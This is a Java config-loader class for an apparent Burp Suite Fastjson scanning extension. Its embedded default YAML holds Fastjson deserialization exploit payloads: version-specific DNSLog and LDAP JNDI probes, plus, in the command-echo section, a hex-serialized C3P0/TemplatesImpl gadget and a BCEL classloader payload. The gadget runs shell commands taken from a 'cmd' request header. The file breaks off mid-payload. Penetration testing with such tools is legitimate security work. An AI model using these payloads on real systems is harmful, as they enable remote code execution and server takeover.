package burp.utils;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.*;

import org.yaml.snakeyaml.Yaml;

import burp.IBurpExtenderCallbacks;

public class YamlReader {
    private static YamlReader instance;
    private static Map<String, Map<String, Object>> properties = new HashMap<>();
    private static Path configPath = null;
    private static long lastModified; // 记录文件最后修改时间
    private static final String CONFIG_CONTENTS = "# 插件启动项\n" +
            "isStart: true\n" +
            "# 绕过waf模块，默认关闭\n" +
            "isStartBypass: false\n" +
            "\n" +
            "# 扫描配置\n" +
            "scan:\n" +
            "  # 问题数量\n" +
            "  # 表示可以接收同一个站点多少个问题个数\n" +
            "  # 超过次数以后就不在对该站点进行扫描了\n" +
            "  # 0 表示无限次接收\n" +
            "  issueNumber: 0\n" +
            "  # 站点扫描次数\n" +
            "  # 超过次数以后就不在对该站点进行扫描了\n" +
            "  # 0 表示无限次扫描\n" +
            "  siteScanNumber: 0\n" +
            "  # 域名扫描规则\n" +
            "  domainName:\n" +
            "    # 域名黑名单\n" +
            "    # 注: 黑名单优先级最高\n" +
            "    # 注: 为空表示关闭该功能\n" +
            "    # 使用规则:\n" +
            "    # 1. 过滤某个域名: www.domain1.com\n" +
            "    # 2. 过滤某个域名的全部子域名: *.domain2.com\n" +
            "    # 3. 过滤某个域名的部分子域名: a.*.domain2.com/*.a.*.domain2.com\n" +
            "    # 使用方法:\n" +
            "    # blacklist:\n" +
            "    #   - \"www.domain1.com\"\n" +
            "    #   - \"*.domain2.com\"\n" +
            "    blacklist:\n" +
            "      - \"*.dnslog.cn\"\n" +
            "      - \"*.ceye.io\"\n" +
            "      - \"*.fofa.so\"\n" +
            "      - \"*.shodan.io\"\n" +
            "      - \"*.eyes.sh\"\n" +
            "      - \"*.github.com\"\n" +
            "      - \"*.apple.com\"\n" +
            "      - \"*.bilibili.com\"\n" +
            "      - \"*.dingtalk.com\"\n" +
            "      - \"*.amap.com\"\n" +
            "      - \"*.taobao.com\"\n" +
            "      - \"*.umeng.com\"\n" +
            "    # 域名白名单\n" +
            "    # 注: 黑名单优先级最高\n" +
            "    # 注: 为空表示关闭该功能\n" +
            "    # 使用规则:\n" +
            "    # 1. 只扫描某个域名: www.domain1.com\n" +
            "    # 2. 只扫描某个域名的全部子域名: *.domain2.com\n" +
            "    # 3. 只扫描某个域名的部分子域名: a.*.domain2.com/*.a.*.domain2.com\n" +
            "    # 使用方法:\n" +
            "    # whitelist:\n" +
            "    #   - \"www.domain1.com\"\n" +
            "    #   - \"*.domain2.com\"\n" +
            "    whitelist:\n" +
            "\n" +
            "# url黑名单后缀\n" +
            "# url的后缀出现这些字段的都不进行测试\n" +
            "urlBlackListSuffix:\n" +
            "  config:\n" +
            "    isStart: true\n" +
            "  suffixList:\n" +
            "    - \"3g2\"\n" +
            "    - \"3gp\"\n" +
            "    - \"7z\"\n" +
            "    - \"aac\"\n" +
            "    - \"abw\"\n" +
            "    - \"aif\"\n" +
            "    - \"aifc\"\n" +
            "    - \"aiff\"\n" +
            "    - \"arc\"\n" +
            "    - \"au\"\n" +
            "    - \"avi\"\n" +
            "    - \"azw\"\n" +
            "    - \"bin\"\n" +
            "    - \"bmp\"\n" +
            "    - \"bz\"\n" +
            "    - \"bz2\"\n" +
            "    - \"cmx\"\n" +
            "    - \"cod\"\n" +
            "    - \"csh\"\n" +
            "    - \"css\"\n" +
            "    - \"csv\"\n" +
            "    - \"doc\"\n" +
            "    - \"docx\"\n" +
            "    - \"eot\"\n" +
            "    - \"epub\"\n" +
            "    - \"gif\"\n" +
            "    - \"gz\"\n" +
            "    - \"ico\"\n" +
            "    - \"ics\"\n" +
            "    - \"ief\"\n" +
            "    - \"jar\"\n" +
            "    - \"jfif\"\n" +
            "    - \"jpe\"\n" +
            "    - \"jpeg\"\n" +
            "    - \"jpg\"\n" +
            "    - \"m3u\"\n" +
            "    - \"mid\"\n" +
            "    - \"midi\"\n" +
            "    - \"mjs\"\n" +
            "    - \"mp2\"\n" +
            "    - \"mp3\"\n" +
            "    - \"mpa\"\n" +
            "    - \"mpe\"\n" +
            "    - \"mpeg\"\n" +
            "    - \"mpg\"\n" +
            "    - \"mpkg\"\n" +
            "    - \"mpp\"\n" +
            "    - \"mpv2\"\n" +
            "    - \"odp\"\n" +
            "    - \"ods\"\n" +
            "    - \"odt\"\n" +
            "    - \"oga\"\n" +
            "    - \"ogv\"\n" +
            "    - \"ogx\"\n" +
            "    - \"otf\"\n" +
            "    - \"pbm\"\n" +
            "    - \"pdf\"\n" +
            "    - \"pgm\"\n" +
            "    - \"png\"\n" +
            "    - \"pnm\"\n" +
            "    - \"ppm\"\n" +
            "    - \"ppt\"\n" +
            "    - \"pptx\"\n" +
            "    - \"ra\"\n" +
            "    - \"ram\"\n" +
            "    - \"rar\"\n" +
            "    - \"ras\"\n" +
            "    - \"rgb\"\n" +
            "    - \"rmi\"\n" +
            "    - \"rtf\"\n" +
            "    - \"snd\"\n" +
            "    - \"svg\"\n" +
            "    - \"swf\"\n" +
            "    - \"tar\"\n" +
            "    - \"tif\"\n" +
            "    - \"tiff\"\n" +
            "    - \"ttf\"\n" +
            "    - \"vsd\"\n" +
            "    - \"wav\"\n" +
            "    - \"weba\"\n" +
            "    - \"webm\"\n" +
            "    - \"webp\"\n" +
            "    - \"woff\"\n" +
            "    - \"woff2\"\n" +
            "    - \"xbm\"\n" +
            "    - \"xls\"\n" +
            "    - \"xlsx\"\n" +
            "    - \"xpm\"\n" +
            "    - \"xul\"\n" +
            "    - \"xwd\"\n" +
            "    - \"zip\"\n" +
            "    - \"js\"\n" +
            "    - \"wmv\"\n" +
            "    - \"asf\"\n" +
            "    - \"asx\"\n" +
            "    - \"rm\"\n" +
            "    - \"rmvb\"\n" +
            "    - \"mp4\"\n" +
            "    - \"mov\"\n" +
            "    - \"m4v\"\n" +
            "    - \"dat\"\n" +
            "    - \"mkv\"\n" +
            "    - \"flv\"\n" +
            "    - \"vob\"\n" +
            "    - \"txt\"\n" +
            "    - \"php\"\n" +
            "    - \"asp\"\n" +
            "\n" +
            "# 应用程序配置\n" +
            "application:\n" +
            "  lowPerceptionScan:\n" +
            "    config:\n" +
            "      # 插件启动项\n" +
            "      isStart: true\n" +
            "      # 提供商\n" +
            "      provider: \"versionDetect\"\n" +
            "      dnslogPayloads:\n" +
            "      # 新增自定义payload时记得将dns地址同一更改为dnslog-url\n" +
            "        - \"{\\\"@type\\\":\\\"java.net.Inet4Address\\\",\\\"val\\\":\\\"dnslog-url\\\"}\"\n" +
            "        - \"{{\\\"@type\\\":\\\"java.net.URL\\\",\\\"val\\\":\\\"http://dnslog-url\\\"}:\\\"x\\\"}\"\n" +
            "        - \"{\\\"@type\\\":\\\"java.net.InetSocketAddress\\\"{\\\"address\\\":,\\\"val\\\":\\\"dnslog-url\\\"}}\"\n" +
            "  detectVersionExtension:\n" +
            "    config:\n" +
            "      # 插件启动项\n" +
            "      isStart: true\n" +
            "      # 提供商\n" +
            "      provider: \"versionDetect\"\n" +
            "      regexPayloads:\n" +
            "        # 分号左侧匹配为正则匹配式，匹配响应包中的fastjson-version x.xx.xx 版本号\n" +
            "        # payload=右侧填入对应payload\n" +
            "        - \"(?i)fastjson-version[\\\\s:=]+(\\\\d+\\\\.\\\\d+\\\\.\\\\d+); payload={\\\"@type\\\":\\\"java.lang.AutoCloseable\\\"\"\n" +
            "      dnslogPayloads:\n" +
            "        # 自行根据payload进行版本调整\n" +
            "        # 新增自定义payload时记得将dns地址同一更改为dnslog-url\n" +
            "        # 添加payload时记得注意格式\n" +
            "        # 分号左侧可随意填写版本号，用于在插件中显示。payload=右侧填入对应payload\n" +
            "        - \"autoType open; payload=[{\\\"@type\\\":\\\"java.net.CookiePolicy\\\"},{\\\"@type\\\":\\\"java.net.Inet4Address\\\",\\\"val\\\":\\\"dnslog-url\\\"}]\"\n" +
            "        - \"version<=1.2.24; payload={\\\"name\\\":\\\"admin\\\",\\\"email\\\":\\\"admin\\\",\\\"content\\\":{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://dnslog-url/POC\\\",\\\"autoCommit\\\":true}}\"\n" +
            "#        - \"version<=1.2.47; payload={\\\"username\\\":{\\\"@type\\\": \\\"java.net.InetSocketAddress\\\"{\\\"address\\\":,\\\"val\\\":\\\"dnslog-url\\\"}}}[{\\\"@type\\\": \\\"java.lang.Class\\\",\\\"val\\\": \\\"java.io.ByteArrayOutputStream\\\"},{\\\"@type\\\":\\\"java.io.ByteArrayOutputStream\\\"},{\\\"@type\\\":\\\"java.net.InetSocketAddress\\\"{\\\"address\\\":,\\\"val\\\":\\\"dnslog-url\\\"}}]\"\n" +
            "        - \"version<=1.2.47; payload=[{\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"java.io.ByteArrayOutputStream\\\"},{\\\"@type\\\":\\\"java.io.ByteArrayOutputStream\\\"},{\\\"@type\\\":\\\"java.net.InetSocketAddress\\\"{\\\"address\\\":,\\\"val\\\":\\\"dnslog-url\\\"}}]\"\n" +
            "        - \"version<1.2.49; payload={\\\"@type\\\":\\\"java.net.InetSocketAddress\\\"{\\\"address\\\":,\\\"val\\\":\\\"dnslog-url\\\"}}\"\n" +
            "        - \"version<=1.2.68; payload=[{\\\"@type\\\":\\\"java.lang.AutoCloseable\\\",\\\"@type\\\": \\\"java.io.ByteArrayOutputStream\\\"},{\\\"@type\\\": \\\"java.io.ByteArrayOutputStream\\\"},{\\\"@type\\\": \\\"java.net.InetSocketAddress\\\"{\\\"address\\\":,\\\"val\\\": \\\"dnslog-url\\\"}}]\"\n" +
            "        - \"version<=1.2.80; payload=[{\\\"@type\\\":\\\"java.lang.Exception\\\",\\\"@type\\\":\\\"com.alibaba.fastjson.JSONException\\\",\\\"x\\\":{\\\"@type\\\":\\\"java.net.InetSocketAddress\\\"{\\\"address\\\":,\\\"val\\\": \\\"dnslog-url\\\"}}},{\\\"@type\\\":\\\"java.lang.Exception\\\",\\\"@type\\\":\\\"com.alibaba.fastjson.JSONException\\\",\\\"message\\\":{\\\"@type\\\":\\\"java.net.InetSocketAddress\\\"{\\\"address\\\":,\\\"val\\\": \\\"dnslog-url\\\"}}}]\"\n" +
            "  detectLibraryExtension:\n" +
            "    config:\n" +
            "      # 插件启动项\n" +
            "      isStart: true\n" +
            "      # 提供商\n" +
            "      provider: \"libraryDetect\"\n" +
            "      libraryPayloads: \"{\\\"x\\\":{\\\"@type\\\":\\\"java.lang.Character\\\"{\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"libraries\\\"}}\"\n" +
            "      libraries:\n" +
            "        - \"org.springframework.web.bind.annotation.RequestMapping\" #SpringBoot\n" +
            "        - \"org.apache.catalina.startup.Tomcat\"  #Tomcat\n" +
            "        - \"groovy.lang.GroovyShell\"  #Groovy - 1.2.80\n" +
            "        - \"com.mchange.v2.c3p0.DataSources\"  #C3P0\n" +
            "        - \"com.mysql.jdbc.Buffer\"  #mysql-jdbc-5\n" +
            "        - \"com.mysql.cj.api.authentication.AuthenticationProvider\"  #mysql-connect-6\n" +
            "        - \"com.mysql.cj.protocol.AuthenticationProvider\" #mysql-connect-8\n" +
            "        - \"sun.nio.cs.GBK\"  #JDK8\n" +
            "        - \"java.net.http.HttpClient\"  #JDK11\n" +
            "        - \"org.apache.ibatis.type.Alias\"  #Mybatis\n" +
            "        - \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\"  #tomcat-dbcp-7-BCEL\n" +
            "        - \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\" #tomcat-dbcp-8及以后-BCEL\n" +
            "        - \"org.apache.commons.io.Charsets\"       # 存在commons-io,但不确定版本\n" +
            "        - \"org.apache.commons.io.file.Counters\"  #commons-io-2.7-2.8\n" +
            "        - \"org.aspectj.ajde.Ajde\"  #aspectjtools\n" +
            "  # 命令回显扩展\n" +
            "  cmdEchoExtension:\n" +
            "    config:\n" +
            "      isStart: true\n" +
            "      # 提供商\n" +
            "      provider: \"CmdEchoScan\"\n" +
            "      # 命令输入点字段名称\n" +
            "      # 发送命令回显的Header字段名称\n" +
            "      # 注意: 设置以后,所有的poc都要记得支持这个字段进行命令输入\n" +
            "      commandInputPointField: \"cmd\"\n" +
            "      payloads:\n" +
            "        - \"{\\\"e\\\":{\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\\"},\\\"f\\\":{\\\"@type\\\":\\\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\\",\\\"userOverridesAsString\\\":\\\"HexAsciiSerializedMap:aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d657400124c6a6176612f6c616e672f537472696e673b4c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000001757200025b42acf317f8060854e0020000787000001439cafebabe00000032013d0100506f72672f6170616368652f736869726f2f636f796f74652f7365722f7374642f537472696e6753657269616c697a65726462633635336235323930613434383961666465316364663338316531396234070001010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740700030100063c696e69743e0100032829560100136a6176612f6c616e672f457863657074696f6e0700070c000500060a0004000901000372756e0c000b00060a0002000c0100106765745265714865616465724e616d6501001428294c6a6176612f6c616e672f537472696e673b010003636d6408001001001e6a6176612f6c616e672f4e6f537563684669656c64457863657074696f6e0700120100136a6176612f6c616e672f5468726f7761626c650700140100106a6176612f6c616e672f54687265616407001601000a6765745468726561647308001801000f6a6176612f6c616e672f436c61737307001a0100125b4c6a6176612f6c616e672f436c6173733b07001c0100116765744465636c617265644d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0c001e001f0a001b00200100186a6176612f6c616e672f7265666c6563742f4d6574686f6407002201000d73657441636365737369626c65010004285a29560c002400250a002300260100106a6176612f6c616e672f4f626a656374070028010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0c002a002b0a0023002c0100135b4c6a6176612f6c616e672f5468726561643b07002e0100076765744e616d650c0030000f0a00170031010004687474700800330100106a6176612f6c616e672f537472696e67070035010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a0c003700380a003600390100084163636570746f7208003b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0c003d003e0a0029003f0100067461726765740800410100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0c004300440a001b00450100176a6176612f6c616e672f7265666c6563742f4669656c640700470a00480026010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0c004a004b0a0048004c010008656e64706f696e7408004e01000674686973243008005001000768616e646c657208005201000d6765745375706572636c6173730c0054003e0a001b0055010006676c6f62616c08005701000e676574436c6173734c6f6164657201001928294c6a6176612f6c616e672f436c6173734c6f616465723b0c0059005a0a001b005b0100226f72672e6170616368652e636f796f74652e5265717565737447726f7570496e666f08005d0100156a6176612f6c616e672f436c6173734c6f6164657207005f0100096c6f6164436c617373010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0c006100620a006000630a001b003101000a70726f636573736f72730800660100136a6176612f7574696c2f41727261794c69737407006801000473697a650100032829490c006a006b0a0069006c0100152849294c6a6176612f6c616e672f4f626a6563743b0c004a006e0a0069006f0100037265710800710100076765744e6f74650800730100116a6176612f6c616e672f496e7465676572070075010004545950450100114c6a6176612f6c616e672f436c6173733b0c00770078090076007901000776616c75654f660100162849294c6a6176612f6c616e672f496e74656765723b0c007b007c0a0076007d01000967657448656164657208007f0100096765744d6574686f640c0081001f0a001b00820c000e000f0a0002008401000b676574526573706f6e736508008601000967657457726974657208008801000e6a6176612f696f2f57726974657207008a01000668616e646c65010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b0c008c008d0a0002008e0100057772697465010015284c6a6176612f6c616e672f537472696e673b29560c009000910a008b0092010005666c7573680c009400060a008b0095010005636c6f73650c009700060a008b0098010004657865630100076f732e6e616d6508009b0100106a6176612f6c616e672f53797374656d07009d01000b67657450726f70657274790c009f008d0a009e00a001000b746f4c6f776572436173650c00a2000f0a003600a301000377696e0800a50100072f62696e2f73680800a70100022d630800a9010007636d642e6578650800ab0100022f630800ad0100116a6176612f6c616e672f52756e74696d650700af01000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b0c00b100b20a00b000b3010028285b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0c009a00b50a00b000b60100116a6176612f6c616e672f50726f636573730700b801000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0c00ba00bb0a00b900bc0100116a6176612f7574696c2f5363616e6e65720700be010018284c6a6176612f696f2f496e70757453747265616d3b29560c000500c00a00bf00c10100025c610800c301000c75736544656c696d69746572010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f7574696c2f5363616e6e65723b0c00c500c60a00bf00c70100000800c90100076861734e65787401000328295a0c00cb00cc0a00bf00cd0100176a6176612f6c616e672f537472696e674275696c6465720700cf0a00d00009010006617070656e6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e674275696c6465723b0c00d200d30a00d000d40100046e6578740c00d6000f0a00bf00d7010008746f537472696e670c00d9000f0a00d000da01000a6765744d6573736167650c00dc000f0a000800dd0100135b4c6a6176612f6c616e672f537472696e673b0700df0100136a6176612f696f2f496e70757453747265616d0700e101000665794a6558410800e301000a73746172747357697468010015284c6a6176612f6c616e672f537472696e673b295a0c00e500e60a003600e70100066c656e6774680c00e9006b0a003600ea010006636861724174010004284929430c00ec00ed0a003600ee0100152843294c6a6176612f6c616e672f537472696e673b0c007b00f00a003600f10100087061727365496e74010015284c6a6176612f6c616e672f537472696e673b29490c00f300f40a007600f50100012e0800f7010007696e6465784f660c00f900f40a003600fa010009737562737472696e67010016284949294c6a6176612f6c616e672f537472696e673b0c00fc00fd0a003600fe01000c6261736536344465636f6465010016284c6a6176612f6c616e672f537472696e673b295b420c010001010a0002010201000178010006285b42295b420c010401050a00020106010005285b4229560c000501080a003601090100062f396a2f344108010b0c009a008d0a0002010d010008676574427974657301000428295b420c010f01100a0036011101000c626173653634456e636f6465010016285b42294c6a6176612f6c616e672f537472696e673b0c011301140a000201150100052f396b3d3d08011701001673756e2e6d6973632e4241534536344465636f646572080119010007666f724e616d650c011b00620a001b011c01000c6465636f646542756666657208011e01000b6e6577496e7374616e636501001428294c6a6176612f6c616e672f4f626a6563743b0c012001210a001b01220100025b420701240100106a6176612e7574696c2e42617365363408012601000a6765744465636f6465720801280100066465636f646508012a01000a676574456e636f64657208012c0100135b4c6a6176612f6c616e672f4f626a6563743b07012e01000e656e636f6465546f537472696e6708013001001673756e2e6d6973632e424153453634456e636f646572080132010006656e636f646508013401000f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f0801360100083c636c696e69743e0a00020009010004436f646501000a457863657074696f6e7301000d537461636b4d61705461626c650021000200040000000000090001000500060002013a0000001500010001000000092ab7000a2ab7000db100000000013b00000004000100080002000e000f0001013a0000000f00010001000000031211b0000000000002000b00060001013a000003290006000b000002461217121903bd001bc0001db600214c2b04b600272b0103bd0029b6002dc0002fc0002fc0002f4d033e1d2cbea202152c1d32b600321234b6003a9902012c1d32b60032123cb6003a9901f32c1d32b600401242b600463a04190404b6004919042c1d32b6004d3a051905b60040124fb600463a04a700113a061905b600401251b600463a04190404b6004919041905b6004d3a051905b600401253b600463a04a7002b3a061905b60040b600561253b600463a04a700173a071905b60040b60056b600561253b600463a04190404b6004919041905b6004d3a051905b600401258b600463a04a700143a061905b60040b600561258b600463a04190404b6004919041905b6004d3a051905b60040b6005c125eb60064571905b60040b60065125eb6003a9901171905b600401267b600463a04190404b6004919041905b6004dc000693a0603360715071906b6006da200ec19061507b60070b600401272b600463a04190404b60049190419061507b60070b6004db60040127404bd001b5903b2007a53b60021190419061507b60070b6004d04bd0029590304b8007e53b6002d3a05190419061507b60070b6004db60040128004bd001b5903123653b60083190419061507b60070b6004d04bd002959032ab7008553b6002dc000363a081908c6004f1905b60040128703bd001bb60021190503bd0029b6002d3a091909b60040128903bd001bb60083190903bd0029b6002dc0008b3a0a190a1908b8008fb60093190ab60096190ab60099a7000ea700053a09840701a7ff10840301a7fdeba700044cb100060068007400770013009400a000a3001300a500b400b7001300da00e600e9001301a3022d0233000800000241024400150001013c000000a10010fe002907002307002f01ff004d000607000207002307002f0107004807002900010700130d5d070013ff0013000707000207002307002f010700480700290700130001070013fa00135d07001310fd004d07006901fc00e7070036ff0002000807000207002307002f0107004807002907006901000107000801ff0005000407000207002307002f01000005ff000200010700020001070015fc0000070029000a009a008d0001013a000000e30004000700000093043c129cb800a14d2cc600112cb600a412a6b6003a990005033c1b99001806bd0036590312a853590412aa5359052a53a7001506bd0036590312ac53590412ae5359052a534eb800b42db600b7b600bd3a04bb00bf591904b700c212c4b600c83a0512ca3a061905b600ce99001fbb00d059b700d11906b600d51905b600d8b600d5b600db3a06a7ffdf1906b04c2bb600deb000010000008c008d00080001013c000000360006fd001a0107003618510700e0ff00200007070036010700360700e00700e20700bf070036000023ff000200010700360001070008000a008c008d0002013a000000b8000600060000008f12e44c014d2a2bb600e89900802a2bb600ebb600efb800f2b800f63e03360403360515051da2001b15042a2bb600eb0460150560b600ef603604840501a7ffe5bb0036592a2bb600eb04601d601504602a12f8b600fbb600ffb80103b80107b7010a4dbb00d059b700d113010cb600d52cb8010eb60112b80107b80116b600d5130118b600d5b600dbb02ab8010eb000000001013c000000170003ff002200060700360700360501010100001df80049013b0000000400010008000a010001010002013a0000008f000600040000006f13011ab8011d4c2b13011f04bd001b5903123653b600832bb6012304bd002959032a53b6002dc00125c00125b04c130127b8011d4d2c13012903bd001bb600830103bd0029b6002d4e2db6004013012b04bd001b5903123653b600832d04bd002959032a53b6002dc00125c00125b000010000002c002d00080001013c0000000600016d070008013b00000004000100080009011301140002013a000000af000600050000007a014c130127b8011d4d2c13012d01c0001db600832c01c0012fb6002d4e2db6004013013104bd001b590313012553b600832d04bd002959032a53b6002dc000364ca700374e130133b8011d4d2cb601233a041904b6004013013504bd001b590313012553b60083190404bd002959032a53b6002dc000364c2bb0000100020041004400080001013c0000001b0002ff004400020701250700360001070008fd003307001b070029013b00000004000100080009010401050001013a00000049000600040000002a130137b601124c2abebc084d033e1d2abea200172c1d2a1d332b1d2bbe7033829154840301a7ffe92cb000000001013c0000000d0002fe000e07012507012501190008013800060001013a0000002e000200010000000dbb000259b7013957a700044bb1000100000008000b00080001013c0000000700024b0700080000007074002461313463653830632d343431302d343633332d623961632d30613762356365313238653870770100787372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d65737361676571007e00055b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787070707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd223902000078700000000070787372001e636f6d2e616c69626162612e666173746a736f6e2e4a534f4e417272617900000000000000010200014c00046c69737471007e00137870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a6578700000000177040000000171007e00077878;\\\"}}\"\n" +
            "        - \"{{\\\"@type\\\":\\\"com.alibaba.fastjson.JSONObject\\\",\\\"x\\\":{\\\"@type\\\":\\\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\\\",\\\"driverClassLoader\\\":{\\\"@type\\\":\\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"},\\\"driverClassName\\\":\\\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d